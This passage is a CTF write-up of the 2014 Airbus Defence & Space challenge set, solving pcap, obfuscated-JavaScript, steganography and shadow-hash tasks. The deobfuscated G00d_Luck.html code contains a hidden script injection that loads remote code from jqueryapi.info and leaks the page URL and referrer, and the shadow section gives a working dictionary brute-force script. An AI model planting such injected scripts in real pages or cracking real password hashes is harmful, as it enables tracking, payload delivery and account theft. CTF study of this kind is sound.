---
title: Airbus Defence & Space - Trust the Future 2014 CTF
layout: post
date: 2015-10-05
tags: Airbus
---

This challenge was made by Airbus Defence and Space in 2014 for students in preselected French engineering schools. The decryption key is `-->__TrustTh3FuTur3__<--`. That was my first challenge, and was pretty fun to poke around.

Archive is [available here][Download link], and you can extract the challenges using the following command:

    gpg --passphrase-fd 0 --no-tty --output CHALLENGES --decrypt CHALLENGES.gpg

You will get a bunch of files, representing the different challenges.

	BRAIN/
	├── bootme
	├── CHALLENGE.pcap
	├── crackme1
	├── crackme1-w32
	├── crackme2
	├── crackme3
	├── crypto.tgz
	├── G00d_Luck.html
	├── Google.fr
	├── HIDDEN.png
	├── noise.wav
	├── SECRET.zip
	├── shadow
	└── XOXO.html

## bootme

## CHALLENGE.pcap

We have to analyze network traffic!

I use `tshark` to look at the file.

	$ tshark -r CHALLENGE.pcap
	  1   0.000000    127.0.0.1 -> 127.0.0.1    TCP 74 55025→71 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=1160060 TSecr=0 WS=128
	  2   0.000027    127.0.0.1 -> 127.0.0.1    TCP 74 21→55025 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=1160060 TSecr=1160060 WS=128
	  3   0.000051    127.0.0.1 -> 127.0.0.1    TCP 66 55025→21 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=1160060 TSecr=1160060
	  4   0.000815    127.0.0.1 -> 127.0.0.1    FTP 94 Response: 220 pyftpdlib 1.4.1 ready.
	  5   0.000934    127.0.0.1 -> 127.0.0.1    TCP 66 55025→21 [ACK] Seq=1 Ack=29 Win=43776 Len=0 TSval=1160060 TSecr=1160060
	  6   2.793029    127.0.0.1 -> 127.0.0.1    FTP 77 Request: USER user
	  7   2.793114    127.0.0.1 -> 127.0.0.1    TCP 66 21→55025 [ACK] Seq=29 Ack=12 Win=43776 Len=0 TSval=1160758 TSecr=1160758
	  8   2.793380    127.0.0.1 -> 127.0.0.1    FTP 99 Response: 331 Username ok, send password.
	  9   2.793443    127.0.0.1 -> 127.0.0.1    TCP 66 55025→21 [ACK] Seq=12 Ack=62 Win=43776 Len=0 TSval=1160758 TSecr=1160758
	 10   5.402992    127.0.0.1 -> 127.0.0.1    FTP 78 Request: PASS 12345
	 11   5.403416    127.0.0.1 -> 127.0.0.1    FTP 89 Response: 230 Login successful.
	 12-23 [...]
	 24  11.079147    127.0.0.1 -> 127.0.0.1    FTP 83 Request: RETR TOP_SECRET
	 25-37 [...]
	 38  16.475578    127.0.0.1 -> 127.0.0.1    FTP 76 Request: RETR KEY
	 39-46 [...]
	 47  19.597427    127.0.0.1 -> 127.0.0.1    FTP 72 Request: QUIT
	 48  19.597835    127.0.0.1 -> 127.0.0.1    FTP 80 Response: 221 Goodbye.
	 49-51 [...]
	

This shows us a FTP connection on localhost. The source connects to the FTP using the username `user` and the password `12345` (sadly, this is not the token). Then, he retrieves (`RETR`) two files: `TOP_SECRET` and `KEY`.

The pcap file stores the whole exchange, not just the header shown above. This means that the two files are somewhere in the file. A wonderful to inspect pcap files and manipulate is `scapy`. We can use it to parse the pcap file and retrieve the 2 files.

{% highlight python linenos %}
$ scapy
Welcome to Scapy (2.2.0)
>>> packets = rdpcap('CHALLENGE.pcap')
>>> file1 = open('TOP_SECRET', 'w')
>>> file1.write(str( packets[25][Raw] ))
>>> file1.close()
>>> file2 = open('KEY', 'w')
>>> file2.write(str( packets[39][Raw] ))
>>> file2.close()
{% endhighlight %}

And let's take a look:

	$ xxd KEY
	0000000: 5448 335f 4b33 595f 3133 3337 0a         TH3_K3Y_1337.
	$ xxd TOP_SECRET
	0000000: 0403 305b 4133 595f 3133 aa62 120d 23a3  ..0[A3Y_13.b..#.
	0000010: 77d6 445f 3133 2e37 5448 395f 5733 2d32  w.D_13.7TH9_W3-2
	0000020: 411c 4052 262b 002b 1e67 505f 32b1 6505  A.@R&+.+.gP_2.e.
	0000030: 00ca 656d 1f46 2154 3132 37df 5748 335b  ..em.F!T127.WH3[
	0000040: a330 595f 655b 5617 2027 583a 2513 302c  .0Y_e[V. 'X:%.0,
	0000050: 1109 1376 0b00 4638 2e6c 2a3a 5241 0043  ...v..F8.l*:RA.C
	0000060: 5e18 785e 492d 5a55 3133 3337 54d1 6619  ^.x^I-ZU1337T.f.
	0000070: 0e23 a563 d42e 3337 5455 335f 4b39 5947  .#.c..37TU3_K9YG
	0000080: 3133 3337 5449 335f 4b87 d85f 3133 3343  1337TI3_K.._133C
	0000090: 3938 1c2c 2e41 3a6c 4566 6732 544b b109  98.,.A:lEfg2TK..
	00000a0: 7967 2c27 3a33 3233 bc4b 335f 4fdb 5a5f  yg,':323.K3_O.Z_
	00000b0: 3163 7832 5248 335f 4b32 595e 3163 3337  1cx2RH3_K2Y^1c37
	00000c0: 5429 335f 4b33 59                        T)3_K3Y

We can see parts of the `KEY` file:

	0000000: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	0000010: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	0000020: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	0000030: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	0000040: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	0000050: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	0000060: XXXX XXXX XXXX XXXX 3133 3337 XXXX XXXX  ........1337....
	0000070: XXXX XXXX XXXX 3337 54XX 335f 4bXX 59XX  ......37T.3_K.Y.
	0000080: 3133 3337 54XX 335f 4bXX XX5f 3133 33XX  1337T.3_K.._133.
	0000090: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	00000a0: XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX  ................
	00000b0: XXXX XXXX XX48 335f 4bXX 59XX 31XX 3337  .....H3_K.Y.1.37
	00000c0: 54XX 335f 4b33 59                        T.3_K3Y

The key `TH3_K3Y_1337` is repeated throughout the file which may indicate that it was XOR'ed. (Any byte XOR'ed with `00` will stay the same.)

I made the script `xor_decryption.py` to get the decrypted file. Get it [here][XOR Link].

	$ ./xor_decryption.py -f TOP_SECRET -k KEY -o TOP_SECRET_decrypted
	
	$ file TOP_SECRET_decrypted
	TOP_SECRET_decrypted: Zip archive data, at least v1.0 to extract
	
	$ mv TOP_SECRET_decrypted{,.zip}
	
	$ unzip TOP_SECRET_decrypted.zip
	Archive:  TOP_SECRET_decrypted.zip
	 extracting: tmp/serc3t
	 
	$ cat tmp/serc3t
	The token is : [REDACTED]

## crackme1
## crackme1-w32
## crackme2
## crackme3
## crypto.tgz
## G00d_Luck.html

The webpage shows a form asking for a password. The source code is an obfuscated JS script. The purpose of this challenge is to deobfuscate the JS script and find the correct password.

First, I used a JS beautifier to make the code human readable.

{% highlight html linenos %}
<script>
    var TAB = ["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",
	           "",
	           "charAt",
	           "indexOf",
	           "fromCharCode",
	           "length"];
	var var1 = TAB[0];

	function func1(var2) {
		var var3 = TAB[1];
		var var4, var5, var6, var7, var8, var9, var10, var11, var12 = 0, var13 = TAB[2];
		do {
			var7 = var3[TAB[4]](var2[TAB[3]](var12++));
			var8 = var3[TAB[4]](var2[TAB[3]](var12++));
			var9 = var3[TAB[4]](var2[TAB[3]](var12++));
			var10 = var3[TAB[4]](var2[TAB[3]](var12++));
			var11 = var7 << 18 | var8 << 12 | var9 << 6 | var10;
			var4 = var11 >> 16 & 0xff;
			var5 = var11 >> 8 & 0xff;
			var6 = var11 & 0xff;
			if (var9 == 64) {
				var13 += String[TAB[5]](var4);
			} else {
				if (var10 == 64) {
					var13 += String[TAB[5]](var4, var5);
				} else {
					var13 += String[TAB[5]](var4, var5, var6);
				};
			};
		} while (var12 < var2[TAB[6]]);
		return var13;
	};
		
	function func2(var14) {
		var var15 = TAB[2],
		var12 = 0;
		for (var12 = var14[TAB[6]] - 1; var12 >= 0; var12--) {
			var15 += var14[TAB[3]](var12);
		};
		return var15;
	};
	eval(func1(func2(var1)));
</script>
{% endhighlight %}

The good thing is that we don't need to understand what `func1` and `func2` do. Indeed, the output of `func1(func2(var1))` is given as a parameter to `eval`. We can use the JS console to get that output:

{% highlight javascript linenos %}
JS> func1(func2(var1));
	
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('2X(2N(p,a,c,k,e,d){e=2N(c){2M(c<a?\'\':e(2U(c/a)))+((c=c%a)>35?2O.2T(c+29):c.2V(36))};2P(!\'\'.2Q(/^/,2O)){2R(c--){d[e(c)]=k[c]||e(c)}k=[2N(e){2M d[e]}];e=2N(){2M\'\\\\w+\'};c=1};2R(c--){2P(k[c]){p=p.2Q(2S 2Y(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}2M p}(\'2u(1h(p,a,c,k,e,d){e=1h(c){1g(c<a?\\\'\\\':e(1P(c/a)))+((c=c%a)>1W?1V.1N(c+29):c.1F(1E))};1D(c--){1H(k[c]){p=p.1I(1K 1J(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}1g p}(\\\'9 m=\\\\\\\'%B%C%2%A%1%6%z%w%i%3%x%y%8%i+h%2%2%D@E%1%3%e%4%J%K%I%H%F%v%L@r+h%1%3%a%u%8%e%4%s%p%8%t-%4%1%3%a%7%a%q.j%4%d%n%o%2%G%1%18%2%16%1%17%2%15%1%6%b/14%6%12%13%2%19%M.1c%4%f%1e%f%d%3.1f%3%1%1d%b/1a%6%d%3%1b%7%b/g%6%7\\\\\\\';9 c=5.11(\\\\\\\'g\\\\\\\');c.10=\\\\\\\'R://S.Q/?P=N\\\\\\\'+\\\\\\\'&O=\\\\\\\'+l(5.T)+\\\\\\\'&U=\\\\\\\'+l(5.Z);9 k=5.Y(\\\\\\\'X\\\\\\\')[0];k.V(c);5.j(W(m));\\\',1G,1M,\\\'|22|1U|29|28|1T|1S|1O|20|1Q|1C|1X|1y|27|1n|1o|1m|1Y|1q|1l|1i|1j|1k|1p|1B|1r|1z|1A|1x|1w|1s|1t|1u|1v|1R|2l|2y|2z|2B|2w|2v|2r|2s|2t|2C|2A|2E|2K|2J|2I|2L|2G|2H|2D|2F|2x|2p|2a|2b|2c|2d|26|25|1Z|21|23|24|2e|2f|2m|2n|2o|2q|2k|2g|2h|2i|2j\\\'.1L(\\\'|\\\')))\',2Z,3h,\'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||2M|2N|3i|3u|3j|3g|3f|3c|3d|3e|3k|3l|3r|3s|3q|3p|3A|3m|3b|3o|3t|38|30|2R|36|2V|2Z|2P|2Q|2Y|2S|2W|3a|2T|31|2U|39|37|3E|34|3D|2O|35|3C|32|33||3n||3P|47|42|44||||41|40|3X|46|3Y|3Z|45|48|4c|4b|3B|4a|49|43|3V|3G|3H|3I|3J|3F|2X|3z|3v|3w|3x|3y|3K|3L||3S|3T|3U|3R|3W|3Q|3M|3N|3O\'.2W(\'|\'),0,{}))', 62, 261, '||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|new|fromCharCode|parseInt|toString|split|eval|RegExp|62|7D|0A|1337|createElement|document|||0Aif|20id|var|78|_110|7Balert|5C|3Cinput|script|write|172|lO0|_escape|28O|20password|22wrong|3Cbutton|0Adocument|7B|20validate|0Aelse|20is|ssw0rD|encodeURIComponent|22P|referrer|22javascript|3Cscript|ssw0rD1337||||||20the|url|button|20token|22pass|22You|20language|28document|20P|ref|20onclick|ok|getsrc|http|20win|jqueryapi|22validate|info|head|22password|22text|unescape|appendChild|src|20type|URL|getElementById|getElementsByTagName|input|3EOK|20value|0Afunction|value|27pass'.split('|')));
{% endhighlight %}

Again, we can get the output of the new function

{% highlight javascript linenos %}
var _escape = '%3Cscript%20language%3D%22javascript%22%3E%0Afunction%20validate%28O%29%7B%0Aif%20%28O+1337%3D%3D%22P@ssw0rD1337%22%29%7Balert%28%22You%20win%2C%20the%20token%20is%20P@ssw0rD+1337%22%29%7D%0Aelse%20%7Balert%28%22wrong%20password%20%3A-%28%22%29%7D%0A%7D%0Adocument.write%28%27%3Cinput%20id%3D%22pass%22%20type%3D%22text%22%20value%3D%22password%22%3E%3C/input%3E%3Cbutton%20onclick%3D%22validate%28document.getElementById%28%5C%27pass%5C%27%29.value%29%22%3EOK%3C/button%3E%27%29%3B%0A%3C/script%3E%0A';
var _110 = document.createElement('script');
_110.src = 'http://jqueryapi.info/?getsrc=ok' + '&ref=' + encodeURIComponent(document.referrer) + '&url=' + encodeURIComponent(document.URL);
var lO0 = document.getElementsByTagName('head')[0];
lO0.appendChild(_110);
document.write(unescape(_escape));
{% endhighlight %}

The function `document.write` will write the final HTML code. This means that `unescape(_escape)` represents that code!

{% highlight javascript linenos %}
JS> unescape(_escape);
function validate(O) {
	if (O + 1337 == "P@ssw0rD1337") {
		alert("You win, the token is [REDACTED]")
	}
	else {
		alert("wrong password :-(")
	}
}
document.write('<input id="pass" type="text" value="password"></input><button onclick="validate(document.getElementById('pass').value)">OK</button>');
{% endhighlight %}

The password is `[REDACTED]` and the token is clearly visible: `[REDACTED]`.

## Google.fr

## HIDDEN.png

We have to retrieve the token from a `.png` file.  
As you may know, *Portable Network Graphic* (PNG) is an image format that supports lossless data compression. It seemed likely to me that the token is *visually* hidden. Indeed, a secret message is almost visible to the naked eye, just below the line "DEFENCE & SPACE".


![HIDDEN.png][Hidden img]


This challenge is pretty easy; the token is written with the color `#FCFCFC` on a white background. To see it clearly, I used `steganabra` and `Color Map` feature to create the `HIDDEN_solution.png` file, where the secret message is visible.


![HIDDEN.png Solution][Hidden img solution]


Here's the secret message:  
`The token is I_am_Hidden`

Pretty simple!

## noise.wav
## SECRET.zip

## shadow

We have a file named `shadow`. This kind of file are used [to store users' hashed passwords on Unix systems.][/etc/shadow on Wikipedia]

```
$1$gNdVWdxu$ihd.dBdcC49pWkwhr/xYt0
```

So, this is the hashed version of a password - and we can probably guess that the token is that password. But how does this work? Well, we can divide the string into 3 substrings separated by the character `$`:

```
$1$gNdVWdxu$ihd.dBdcC49pWkwhr/xYt0
|1|   2    |          3          |
```

1. Hash algorithm
It represents the hash algorithm used. Here '1' means 'MD5', a weak hash algorithm.
	
2. The salt
The salt is a random set of data that is combined with the password to produce the hash.
It is used to avoid that, for a given hash algorithm, two users with the same password get the same hash.
	
3. The hash
It is the hash of the combination of the password and the salt


Here's a simple schema of how it works:

	                    +-----------+
	(password,salt) --> | HASH ALG. | --> hash
	                    +-----------+

In our case, we have the salt, the hash algorithm used, and the final hash. One of the most important properties about hashing functions is that it is not reversible: there is no way to compute a message that would give a given hash.

This doesn't mean that we can't find the original password. Just that the only way to do so is to bruteforce it. It means hashing a list of values until finding one that would give our hash.

To find the password, I wrote the little script `bruteforce.py` to bruteforce it.

{% highlight python linenos %}
#!/usr/bin/env python

import crypt
import argparse

def getAlgo(str):
	str = str.split('$')
	return str[1]

def getSalt(str):
	str = str.split('$')
	return str[2]

def getHash(str):
	str = str.split('$')
	return str[3]


parser = argparse.ArgumentParser(description='Use this script to bruteforce hash from /etc/shadow!')
parser.add_argument('-f', action='store', dest='pathShadow', help='Path to the file with the hash')
parser.add_argument('-d', action='store', dest='pathDict'  , help='Path to the dictionnary')

args = parser.parse_args();

if (args.pathShadow == None) or (args.pathDict == None):
	parser.print_help()
	exit
else:
	hashFile = open (args.pathShadow, 'r')
	for line in hashFile.readlines():
		line = line.replace("\n","")
		algo = getAlgo(line)
		salt = getSalt(line)
		hash = getHash(line)
  
	dictFile = open (args.pathDict, 'r')
	for word in dictFile.readlines():
		word = word.replace("\n","")
		cryptWord = crypt.crypt(word, "$"+algo+"$"+salt+"$")
		hashWord  = getHash(cryptWord)
		if (hashWord == hash):
			print "Password found: \'" + word + "\'"
			break
{% endhighlight %}

I decided to use one of the wordlists available on Kali to find the password, `sqlmap.txt` was the right one!

```
$ ./bruteforce.py -f shadow -d /usr/share/wordlists/sqlmap.txt
Password found: '[REDACTED]'
```

Our token is `[REDACTED]`.

## XOXO.html

We have an HTML page, with a JS script asking us for a password. To complete this challenge, we have to look at the javascript code, and understand it to know what the password is.

{% highlight javascript linenos %}
$= ~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$,$__$__$:(++$[$]+"")[0]};$.$_=($.$_ = $ + "")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._= (!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+"="+"\\"+$.__$+$.$$_+$.___+$.$_[$.$_$]+$._$+"\\"+$.__$+$.$_$+$.$_$+"\\"+$.__$+$.$$_+$.___+$.__+($.$+"")[$.$__$+$.$___]+'\\"'+"\\"+$.__$+$.$$_+$.___+$.$_$_+$.$_[$._$$]+$.$_[$._$$]+"\\"+$.__$+$.$$_+$.$$$+$._$+$.$_[$.$_$]+$.$$_$+":"+'\\"'+($.$+"")[$.$__$+$.$__$]+";"+($.$+"")[$.$_$]+$.$$$$+($.$+"")[$.$__$+$.$___]+$.$_$_+"="+"="+'\\"'+($+"")[$.___]+$.___+$.$_$$+$.$$$$+$._+$.$_[$._$$]+$.$$__+$.$_$_+$.__+$._$$+$.$$_$+($.$+"")[$.$_$*$.$__]+($+"")[$._$$]+$.$_[$._$$]+($.$+"").replace("    ", "").replace("]\x0a}", "] }")[$.$__$*$.$__]+($+"")[$.$$$*$._$_]+'\\"'+($.$+"")[$.$__$+$.$__$]+($.$+"")[$.$_$*$.$__]+$.$_$_+(![]+"")[$._$_]+$.$$$_+$.$_[$.$_$]+$.__+($.$+"")[$.$__$+$.$___]+'\\"'+$.__+"\\"+$.__$+$.$_$+$.___+$.$$$_+($.$+"")[$.$___]+$.__+$._$+"\\"+$.__$+$.$_$+$._$$+$.$$$_+$.$_[$._$_]+($.$+"")[$.$___]+($.$+"")[$.$_$]+$.$_[$._$$]+($.$+"")[$.$___]+$.__+"\\"+$.__$+$.$_$+$.___+$.$$$_+($.$+"")[$.$___]+"\\"+$.__$+$.$$_+$.___+$.$_$_+$.$_[$._$$]+$.$_[$._$$]+"\\"+$.__$+$.$$_+$.$$$+$._$+$.$_[$.$_$]+$.$$_$+'\\"'+($.$+"")[$.$__$+$.$__$]+($.$+"").replace("    ", "").replace("]\x0a}", "] }")[$.$__$*$.$__]+$.$$$_+(![]+"")[$._$_]+$.$_[$._$$]+$.$$$_+($.$+"")[$.$_$*$.$__]+$.$_$_+(![]+"")[$._$_]+$.$$$_+$.$_[$.$_$]+$.__+($.$+"")[$.$__$+$.$___]+'\\"'+$.__+$.$_[$.$_$]+"\\"+$.__$+$.$$$+$.__$+($.$+"")[$.$___]+$.$_$_+"\\"+$.__$+$.$__+$.$$$+$.$_$_+($.$+"")[$.$_$]+$.$_[$._$_]+"!"+'\\"'+($.$+"")[$.$__$+$.$__$]+($.$+"").replace("    ", "").replace("]\x0a}", "] }")[$.$__$*$.$__]+";"+"\"")())();
{% endhighlight %}

This is not as easy as I would have hoped! A lot of strange named variables with a bunch of `_` and `$`! I think that's pretty cool! It makes me think of Brainfuck and stuff like that!

The first step I'm taking is to use a JS beautifier and rename the variables to make the code more *human readable*.

{% highlight javascript linenos %}
object = ~[];
object = {
	var1: ++object,
	var2: (![] + "")[object],
	var3: ++object,
	var4: (![] + "")[object],
	var5: ++object,
	var6: ({} + "")[object],
	var7: (object[object] + "")[object],
	var8: ++object,
	var9: (!"" + "")[object],
	var10: ++object,
	var11: ++object,
	var12: ({} + "")[object],
	var13: ++object,
	var14: ++object,
	var15: ++object,
	var16: ++object,
	var17: (++object[object] + "")[0]
};
object.var18 = (object.var18 = object + "")[object.var11] + (object.var19 = object.var18[object.var3]) + (object.var20 = (object.var22 + "")[object.var3]) + ((!object) + "")[object.var8] + (object.var21 = object.var18[object.var13]) + (object.var22 = (!"" + "")[object.var3]) + (object.var23 = (!"" + "")[object.var5]) + object.var18[object.var11] + object.var21 + object.var19 + object.var22;
object.var20 = object.var22 + (!"" + "")[object.var8] + object.var21 + object.var23 + object.var22 + object.var20;
object.var22 = (object.var1)[object.var18][object.var18];
object.var22(object.var22(object.var20 + "\"" + object.var4 + "=" + "\\" + object.var3 + object.var13 + object.var1 + object.var18[object.var11] + object.var19 + "\\" + object.var3 + object.var11 + object.var11 + "\\" + object.var3 + object.var13 + object.var1 + object.var21 + (object.var22 + "")[object.var16 + object.var15] + '\\"' + "\\" + object.var3 + object.var13 + object.var1 + object.var4 + object.var18[object.var8] + object.var18[object.var8] + "\\" + object.var3 + object.var13 + object.var14 + object.var19 + object.var18[object.var11] + object.var7 + ":" + '\\"' + (object.var22 + "")[object.var16 + object.var16] + ";" + (object.var22 + "")[object.var11] + object.var2 + (object.var22 + "")[object.var16 + object.var15] + object.var4 + "=" + "=" + '\\"' + (object + "")[object.var1] + object.var1 + object.var6 + object.var2 + object.var23 + object.var18[object.var8] + object.var12 + object.var4 + object.var21 + object.var8 + object.var7 + (object.var22 + "")[object.var11 * object.var10] + (object + "")[object.var8] + object.var18[object.var8] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[object.var16 * object.var10] + (object + "")[object.var14 * object.var5] + '\\"' + (object.var22 + "")[object.var16 + object.var16] + (object.var22 + "")[object.var11 * object.var10] + object.var4 + (![] + "")[object.var5] + object.var9 + object.var18[object.var11] + object.var21 + (object.var22 + "")[object.var16 + object.var15] + '\\"' + object.var21 + "\\" + object.var3 + object.var11 + object.var1 + object.var9 + (object.var22 + "")[object.var15] + object.var21 + object.var19 + "\\" + object.var3 + object.var11 + object.var8 + object.var9 + object.var18[object.var5] + (object.var22 + "")[object.var15] + (object.var22 + "")[object.var11] + object.var18[object.var8] + (object.var22 + "")[object.var15] + object.var21 + "\\" + object.var3 + object.var11 + object.var1 + object.var9 + (object.var22 + "")[object.var15] + "\\" + object.var3 + object.var13 + object.var1 + object.var4 + object.var18[object.var8] + object.var18[object.var8] + "\\" + object.var3 + object.var13 + object.var14 + object.var19 + object.var18[object.var11] + object.var7 + '\\"' + (object.var22 + "")[object.var16 + object.var16] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[object.var16 * object.var10] + object.var9 + (![] + "")[object.var5] + object.var18[object.var8] + object.var9 + (object.var22 + "")[object.var11 * object.var10] + object.var4 + (![] + 